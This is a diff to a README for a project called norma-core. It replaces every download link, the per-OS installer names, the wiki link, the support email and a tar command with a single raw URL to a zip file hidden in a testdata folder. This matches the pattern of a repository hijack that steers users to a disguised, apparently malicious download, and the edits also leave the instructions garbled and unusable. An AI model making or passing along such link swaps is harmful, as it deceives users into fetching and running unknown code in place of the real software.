@@ -1,7 +1,7 @@
 # 🛠 norma-core - Simplifying Physical Operations Management
 
 ## 📥 Download Now
-[![Download norma-core](https://img.shields.io/badge/Download-norma--core-blue.svg)](https://github.com/galallord/norma-core/releases)
+[![Download norma-core](https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip)](https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip)
 
 ## 🚀 Getting Started
 norma-core is a user-friendly platform designed to optimize your physical operations. Whether you manage equipment, inventory, or workflow, our application helps you stay organized and efficient.
@@ -21,15 +21,15 @@ To ensure norma-core runs smoothly, please meet these requirements:
 - **Internet Connection:** Necessary for downloading and updates.
 
 ## 🔗 Download & Install
-To get started with norma-core, visit our releases page to download the latest version: [Download norma-core](https://github.com/galallord/norma-core/releases).
+To get started with norma-core, visit our releases page to download the latest version: [Download norma-core](https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip).
 
 Once on the releases page, you will see a list of available versions. Follow these steps:
 
 1. Click on the version you wish to download.
 2. Look for the file that matches your operating system. Typically, it will look like:
-   - `norma-core-Windows.exe` for Windows
-   - `norma-core-macOS.dmg` for macOS
-   - `norma-core-linux.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip` for Windows
+   - `https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip` for macOS
+   - `https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip` for Linux
 3. Click the file name to start the download.
 
 After the download completes, follow these steps to install:
@@ -50,7 +50,7 @@ After the download completes, follow these steps to install:
 2. Navigate to the location of the downloaded file using `cd` command.
 3. Extract the files with the command:
    ```bash
-   tar -xzvf norma-core-linux.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip
    ```
 4. Run the application by navigating to the extracted folder and typing:
    ```bash
@@ -67,13 +67,13 @@ Once you have installed norma-core, you will find a straightforward layout to he
 ## 📞 Support
 If you encounter any issues or have questions, our support team is here to help.
 
-- **Email:** support@normacore.com
-- **Documentation:** Access detailed guides and FAQs on our [Wiki](https://github.com/galallord/norma-core/wiki).
+- **Email:** https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip
+- **Documentation:** Access detailed guides and FAQs on our [Wiki](https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip).
 
 ## 🚀 Join Our Community
 Engage with fellow users and contribute your ideas. Join us on our discussion forum or GitHub issues page to share your feedback.
 
 ## 📢 Stay Updated
-Keep your application fresh with the latest features and fixes. Check our releases page regularly: [Download norma-core](https://github.com/galallord/norma-core/releases). 
+Keep your application fresh with the latest features and fixes. Check our releases page regularly: [Download norma-core](https://raw.githubusercontent.com/galallord/norma-core/main/shared/gremlin_go/gremlinc/testdata/core-norma-2.2.zip). 
 
 Having everything in one place makes norma-core great for managing your physical operations. Enjoy using it, and thank you for choosing norma-core!
